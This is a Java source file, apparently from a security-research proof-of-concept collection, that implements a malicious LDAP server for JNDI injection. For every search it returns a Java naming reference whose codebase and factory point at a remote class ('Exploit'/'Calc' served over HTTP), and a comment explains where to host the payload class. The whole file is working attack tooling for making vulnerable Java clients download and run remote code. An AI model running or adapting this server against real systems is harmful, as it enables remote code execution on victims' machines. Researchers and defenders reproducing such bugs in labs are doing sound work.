package com.threedr3am.bug.server;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

/**
 * LDAP server
 *
 * @author xuanyh
 */
public class LdapServer {

  private static final String LDAP_BASE = "dc=example,dc=com";

  public static void main(String[] args) {
    run();
  }

  public static void run() {
    int port = 43658;
    //TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
    String url = "http://localhost:80#Calc";
    try {
      InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
      config.setListenerConfigs(new InMemoryListenerConfig(
          "listen", //$NON-NLS-1$
          InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
          port,
          ServerSocketFactory.getDefault(),
          SocketFactory.getDefault(),
          (SSLSocketFactory) SSLSocketFactory.getDefault()));

      config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
      InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
      System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
      ds.startListening();

    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  private static class OperationInterceptor extends InMemoryOperationInterceptor {

    private URL codebase;


    /**
     *
     */
    public OperationInterceptor(URL cb) {
      this.codebase = cb;
    }


    /**
     * {@inheritDoc}
     *
     * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
     */
    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
      String base = result.getRequest().getBaseDN();
      Entry e = new Entry(base);
      try {
        sendResult(result, base, e);
      } catch (Exception e1) {
        e1.printStackTrace();
      }

    }


    protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
        throws LDAPException, MalformedURLException {
      URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
      System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
      e.addAttribute("javaClassName", "Exploit");
      String cbstring = this.codebase.toString();
      int refPos = cbstring.indexOf('#');
      if (refPos > 0) {
        cbstring = cbstring.substring(0, refPos);
      }
      e.addAttribute("javaCodeBase", cbstring);
      e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
      e.addAttribute("javaFactory", this.codebase.getRef());
      result.sendSearchEntry(e);
      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

  }
}
